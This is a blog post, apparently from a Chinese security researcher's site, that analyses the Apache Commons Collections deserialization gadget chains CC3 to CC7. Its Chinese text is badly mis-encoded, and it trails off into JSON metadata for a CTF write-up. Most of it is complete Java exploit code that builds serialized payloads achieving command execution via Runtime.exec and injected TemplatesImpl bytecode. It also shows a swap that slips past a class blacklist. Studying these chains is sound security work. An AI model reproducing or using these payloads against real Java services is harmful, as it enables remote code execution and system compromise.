1.ä¸ºäº†è¿›å…¥defineTransletClasseséœ€è¦æŠŠæ¶æ„ç±»çš„çˆ¶ç±»è®¾ç½®ä¸ºAbstractTransletã€‚å¦åˆ™_transletIndexä¼šå°äº0çˆ†å‡ºé”™è¯¯ã€‚2.é€šè¿‡åå°„çš„æ–¹å¼æ¥è®¾ç½®queueçš„å€¼ï¼Œè€Œæ˜¯ç›´æ¥addã€‚è¿™é‡Œæˆ‘ä»¬queueçš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯templateså³TemplatesImpl.class.newInstance();ã€‚è¿™æ˜¯ä¸€ä¸ªç±»ã€‚è€Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯1.è¿™ä¸¤ä¸ªå…ƒç´ åœ¨addæ—¶ä¼šå‡ºç°æ¯”è¾ƒå‡ºé”™ã€‚æ‰€ä»¥å¾—ä¿è¯ç±»å‹ä¸€è‡´ã€‚ä¸è¿‡è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯é‡Œé¢æ”¾ä¸¤ä¸ªä¸€æ ·çš„å…ƒç´ å³éƒ½ä¸ºtemplate. CommonsCollections3 CC3åˆå›åˆ°äº†CommonsCollections3.1çš„ä¾èµ–ã€‚æœ‰ç‚¹åƒCC1+CC2ã€‚ç”¨åˆ°äº†ä¸¤ä¸ªé“¾å­çš„å…³é”®å†…å®¹ã€‚ åŒºåˆ«åœ¨äºç”¨äº†TrAXFilterè°ƒç”¨newTransformer() 12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException &#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism(); &#125; ç„¶åä¸åŒäºä»¥å¤–çš„InvokeTransformer,å®ƒæ”¹ç”¨äº†InstantiateTransformer.å…¶transformæ–¹æ³•å¦‚ä¸‹ 12345678public Object transform(Object input) &#123; try &#123; if (!(input instanceof Class)) &#123; throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName())); &#125; else &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; è¿™é‡Œåˆ›å»ºäº†ç±»å®ä¾‹ï¼Œå¦‚æœæŠŠinputè®¾ç½®ä¸ºTrAXFilter,é‚£ä¹ˆå°±ä¼šåœ¨è¿™é‡Œå®ä¾‹åŒ–çš„æ—¶å€™è°ƒç”¨å…¶æ„é€ æ–¹æ³•ï¼Œè§¦å‘TemplatesImpl#newTransformerã€‚ exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package top.bycsec;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class cc3 &#123; public static void main(String[] args) throws Exception &#123; ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"byc404\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;) &#125;); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Deprecated.class,map); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Deprecated.class,proxy_map); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3\")); outputStream.writeObject(handler); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; CommonsCollections4 ä¾èµ–ç¯å¢ƒå˜ä¸ºCommons Collections 4.0 ä¼¼ä¹å°±æ˜¯ä¸ªæ‚äº¤â€¦â€¦å› ä¸ºä¾èµ–å˜ä¸º4.0äº†ã€‚ç›´æ¥ä½¿ç”¨CC2 ä¸­çš„queue+ CC3ä¸­çš„transformè°ƒç”¨ã€‚ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104package top.bycsec;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class cc4 &#123; public static void main(String[] args) throws Exception&#123; Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"byc404\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;) &#125;); Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; CommonsCollections5 cc5è·Ÿè¿‡ä¸€æ¬¡ã€‚å½“æ—¶æ²¡ç”¨jdk1.7çš„ç¯å¢ƒã€‚ç°åœ¨å®éªŒä¸‹jdk1.7 + cc3ä¾èµ–çš„exp.å¦å¤–å‘ç°è¿™ä¸ªé“¾å­cc3,cc4ä¾èµ–éƒ½å¯ä»¥ä½¿ç”¨ã€‚è²Œä¼¼æ˜¯ysoserialåªå†™äº†cc3çš„é“¾å­ã€‚ç¨å¾®æ”¹ä¸‹å°±å¯ä»¥ç”¨åœ¨cc4çš„ç¯å¢ƒäº†ã€‚ é¦–å…ˆé‡ç‚¹è¿˜æ˜¯æ„é€ é“¾å­æ¥è°ƒç”¨å–œé—»ä¹è§çš„åå°„transform rce payload.è¿™é‡Œçš„æ–¹æ³•åœ¨ç¬¬ä¸€ç¯‡å­¦ååºåˆ—åŒ–æ—¶å·²ç»è·Ÿè¿‡äº† ç„¶åæ˜¯ä¸€ä¸ªç»†èŠ‚ï¼š TransformedMap.decorate()æ–¹æ³•èƒ½å°†æ™®é€šçš„MapAè½¬æ¢ä¸ºTransformedMapBï¼ŒåŒæ—¶å¦‚æœTransformedMap.decorate()æ–¹æ³•è®¾ç½®äº†ç¬¬äºŒä¸ªå‚æ•°keyTransformeræˆ–è€…ç¬¬ä¸‰ä¸ªå‚æ•°valueTransformerï¼Œå½“TransformedMapBè°ƒç”¨Mapçš„putæ–¹æ³•æˆ–è€…Map.Entryçš„setValueæ–¹æ³•å°±ä¼šè‡ªåŠ¨è§¦å‘åˆšæ‰è®¾ç½®çš„keyTransformeræˆ–è€…valueTransformerç›¸åº”çš„Transformer ä¹‹æ‰€ä»¥æåˆ°decorate()æ˜¯å› ä¸ºæˆ‘è‡ªå·±è¿™ä¸€éƒ¨åˆ†cc1çš„é“¾å­åœ¨ä¹¦å†™expä¸­ç”¨çš„æ˜¯åå°„å®ä¾‹åŒ–çš„lazymapã€‚å½“æ—¶åªæ˜¯è·Ÿç€åˆ«äººçš„expç”¨åå°„å®ä¾‹åŒ–äº†ï¼Œç»“æœåæ¥å‘ç°æ˜æ˜cc3ä¾èµ–ä¸­ç›´æ¥decorateå°±å¯ä»¥åˆ›å»ºlazymapã€‚è¿™ä¸ªæ–¹æ³•åœ¨cc4ä¾èµ–ä¸­å˜ä¸ºäº†LazpMapæ–¹æ³• ç„¶åæ ¸å¿ƒè¿˜æ˜¯è·Ÿcc1ä¸€æ ·,æ­¤æ—¶åªè¦ä¸€ä¸ªè°ƒç”¨LazyMap#getçš„ä½ç½®æ¥è§¦å‘rceã€‚ ç”¨åˆ°çš„gadgetæ˜¯TiedMapEntry#toString =&gt; getValue =&gt; get.éœ€è¦this.mapä¸ºLazyMap.è·Ÿè¿‡ä¸€éå°±ä¸å†è¯´äº†ã€‚ å†æ¥ä¸‹æ¥æ˜¯BadAttributeValueExpExceptionæ¥è§¦å‘toString.å› ä¸ºå…¶readObjectä¸­valobj.toStringçš„valobjæ¥è‡ªè¾“å…¥çš„valã€‚æ‰€ä»¥ç›´æ¥åå°„è®¾ç½®ä¸ºTiedMapEntryå³å¯ 1234private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); ...... exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap hashMap = new HashMap&lt;String, String&gt;(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"placeholder\"); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(\"placeholder\"); Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(badAttributeValueExpException); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ç„¶åä¸Šé¢è¯´äº†ã€‚æ¢æˆcc4ä¾èµ–æ˜¯é€šæ€çš„ã€‚æˆ‘ä»¬åªéœ€å°†expä¸­ä¾èµ–å…¨éƒ¨æ¢æˆ4çš„ï¼Œç„¶ådecorateæ–¹æ³•æ¢æˆlazyMapæ¥å®ä¾‹åŒ–LazyMapå³å¯ exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package top.bycsec;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap hashMap = new HashMap&lt;String, String&gt;(); Map lazyMap = LazyMap.lazyMap(hashMap,chainedTransformer); //Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"placeholder\"); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(\"placeholder\"); Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(badAttributeValueExpException); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; CommonsCollections6 æ¯”è¾ƒç±»ä¼¼CC5çš„é“¾å­ã€‚ç„¶ååˆ©ç”¨ç¯å¢ƒä¹Ÿæ˜¯3,4é€šæ€ã€‚ cc6çš„gadgetä¸cc5çš„åŒºåˆ«åœ¨äºæ²¡æœ‰åˆ©ç”¨TiedMapEntry#toString,è€Œæ˜¯TiedMapEntry#hashCode è¿™ä¸ªæ–¹æ³•åœ¨URLDNSä¸­å‡ºç°è¿‡,åœ¨ååºåˆ—åŒ–æ—¶ä¼šé‡æ–°è®¡ç®—å¯¹è±¡çš„ hashCode. 12345678public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());&#125;public Object getValue() &#123; return this.map.get(this.key);&#125; è·ŸtoStringä¸€æ ·è°ƒç”¨äº†getValueã€‚æ‰€ä»¥å°±åŸºæœ¬ä¸€æ ·äº†ã€‚ è§¦å‘hashcodeçš„æ–¹æ³•æ˜¯åˆ©ç”¨Hashmapç±»çš„hash 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125; åŠ ä¸ŠhashMap.put 1234567891011121314151617public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; è¿™æ ·å°±å¯ä»¥ç›´æ¥putè§¦å‘äº†ã€‚ç„¶åå®˜æ–¹çš„é“¾å­ä¸çŸ¥é“ä¸ºå•¥åŠ ä¸Šäº†ä¸€ä¸ªHashset,æœ‰ç‚¹å¥‡æ€ªã€‚ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"placeholder\"); HashMap hashMap = new HashMap(); hashMap.put(tiedMapEntry, \"byc\"); Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); innerMap.clear(); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(hashMap); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; åŒæ ·ä¹Ÿæ˜¯ccä¾èµ–3,4é€šç”¨ã€‚ ç„¶åå¼ºç½‘æ¯å½“æ—¶ä¸€é“javaé¢˜è®°å¾—å°±æ˜¯ç”¨çš„cc6çš„é“¾å­æ”¹äº†ä¸‹ã€‚å› ä¸ºå½“æ—¶æ˜¯å­˜åœ¨æ‰‹å†™çš„é»‘åå•ï¼Œä¸èƒ½ç”¨hashmap,ä½†æ˜¯å¯ä»¥æ‰¾æ›¿ä»£çš„hashcodeæ¥åˆ©ç”¨ã€‚æ‰€ä»¥ç”¨HashBagæ›¿æ¢ä¸€ä¸‹å°±è¡Œã€‚ 12HashBag hashMap = new HashBag();hashMap.add(tiedMapEntry, 1); hashBagç»§æ‰¿äº†ä¸€ä¸ªæŠ½è±¡ç±»,ç„¶åæ–¹æ³•åŸºæœ¬è·ŸHashMapå·®ä¸å¤šã€‚æ‰€ä»¥å°æ”¹ä¸‹å°±å¯ä»¥ç›´æ¥æ‰“äº†ã€‚ CommonsCollections7 cc7çš„é“¾å­æ˜¯é€šè¿‡AbstractMap#equalsæ¥è§¦å‘LazyMap#get 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) &#123; if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o; if (m.size() != size()) return false; try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; &#125; &#125; &#125; catch (ClassCastException unused) &#123; return false; &#125; catch (NullPointerException unused) &#123; return false; &#125; return true;&#125; è¿™é‡Œå¦‚æœæ§åˆ¶mä¸ºlazymapå³å¯è§¦å‘rce. ç„¶åcc7æ˜¯åœ¨HashTable#reconstitutionPutä¸­è°ƒç”¨è¿‡equalsæ–¹æ³• 1234567int hash = hash(key); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; ...... ç„¶åHashTableçš„readObjectä¹Ÿè°ƒç”¨è¿‡äº†reconstitutionPut.æ‰€ä»¥å¯ä»¥è§¦å‘ã€‚ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Hashtable;public class cc7 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap innerMap1 = new HashMap&lt;String, String&gt;(); innerMap1.put(\"yy\", \"1\"); // \"yy\".hashCode() == \"zZ\".hashCode() == 3872 HashMap innerMap2 = new HashMap&lt;String, String&gt;(); innerMap2.put(\"zZ\", \"1\"); LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer); LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer); HashMap hashMap = new HashMap(); hashMap.put(lazyMap1, \"placeholder\"); hashMap.put(lazyMap2, \"placeholder\"); innerMap1.remove(\"zZ\"); Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(hashMap); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ã€‚å°±æ˜¯é¦–å…ˆéœ€è¦putä¸¤æ¬¡æ‰èƒ½è°ƒç”¨equalsæ–¹æ³•ã€‚ç„¶åç”±äºä¸€ä¸ªå°bug 1\"yy\".hashCode() == \"zZ\".hashCode() ä¼šå¯¼è‡´â€ç¢°æ’â€å‘ç”Ÿï¼Œå…¶å®å°±æ˜¯å› ä¸ºè¿™æ ·è®¡ç®—å‡ºæ¥çš„hashä¸€è‡´æ‰€ä»¥ä¼šå¯¼è‡´å®ƒè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„equalsæ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚è¿™æ ·å°±èƒ½æˆåŠŸè¿›å…¥æˆ‘ä»¬çš„gadgetäº†ã€‚æœ€åexpremoveæ‰zZè¿™ç¬¬äºŒä¸ªå…ƒç´ ã€‚è¿™æ˜¯è¦å»æ‰è¿™ä¸ªé”®ã€‚å¦åˆ™è¿™ä¸ªhashmapä¼šå¸¦ä¸Šæ— æ³•åºåˆ—åŒ–çš„å¯¹è±¡ä»è€Œä½¿ååºåˆ—åŒ–å¤±è´¥ã€‚ summary æ²¡æƒ³åˆ°æœ€åè¿˜æ˜¯æˆåŠŸæŠŠé“¾å­éƒ½è·Ÿå®Œäº†ã€‚è¿™ç¯‡æ–‡ç« å°±å†™è¿™ä¹ˆå¤šäº†ã€‚ååºåˆ—åŒ–çš„gadgetè·Ÿè¿›è¯´å®è¯æ¯”èµ·phpå°‘äº†ä¸€ç‚¹å˜é€šï¼Œä½†æ˜¯éš¾åº¦è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ã€‚ä¸è¿‡æ•´ä½“ä¸‹æ¥ä¸éš¾å‘ç°Mapç±»,ccåº“ä¸­çš„ä¸€ç³»åˆ—Transformerç±»ï¼Œåå°„çš„æŠ€å·§èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚å¹¶ä¸”å®é™…ä¸Šè‚¯å®šå­˜åœ¨æ›´å¤šgadgetç­‰å¾…å‘æ˜ã€‚ åé¢ä¼šæŠ½ç©ºå»å­¦ä¹ ä¸‹shiro,jackson,fastjsonç­‰ç­‰çš„æ·±åº¦åˆ†æã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"SCTF2020 writeup","slug":"SCTF2020-writeup","date":"2020-07-05T12:33:28.000Z","updated":"2021-02-18T05:09:47.891Z","comments":true,"path":"2020/07/05/SCTF2020-writeup/","link":"","permalink":"https://www.bycsec.top/2020/07/05/SCTF2020-writeup/","excerpt":"è¶Šæ‰“è¶Šèœ :(è¿™æ¬¡æ¯”èµ›éš¾åº¦ç›¸æ¯”ä¸Šæ¬¡RCTFçš„éš¾åº¦å¥½äº†ç‚¹ã€‚ä½†æ˜¯æœ€åè¿˜æ˜¯åªèƒ½æ„Ÿæ…¨è‡ªå·±tclã€‚åšå‡ºæ¥çš„åªæœ‰CloudDiskè·ŸUnsafeDefenseSystem.ç›¸æ¯”ä¸‹solveæ¯”è¾ƒå¤šçš„pythonsandboxè‡ªå·±åè€Œå› ä¸ºæ€»è§‰å¾—pyjailå¤ªè€å¥—ä¸å»ç ”ç©¶,è¿ä¸‹æ‰‹éƒ½åšä¸åˆ°â€¦â€¦èµ›åè¿˜æ˜¯æŠŠèƒ½å¤ç°çš„éƒ½å¤ç°ä¸‹å§ã€‚","text":"è¶Šæ‰“è¶Šèœ 